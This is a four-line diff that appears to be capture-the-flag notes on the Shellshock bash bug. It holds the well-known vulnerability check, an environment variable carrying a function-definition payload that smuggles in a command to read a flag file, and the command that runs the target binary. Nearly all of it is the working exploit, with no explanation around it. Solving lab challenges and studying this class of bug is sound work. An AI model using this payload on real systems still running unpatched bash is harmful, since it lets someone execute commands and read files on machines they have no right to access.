@@ -1,0 +1,4 @@
+Checked with => env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+export x="() { :;}; /bin/cat flag "
+./shellshock
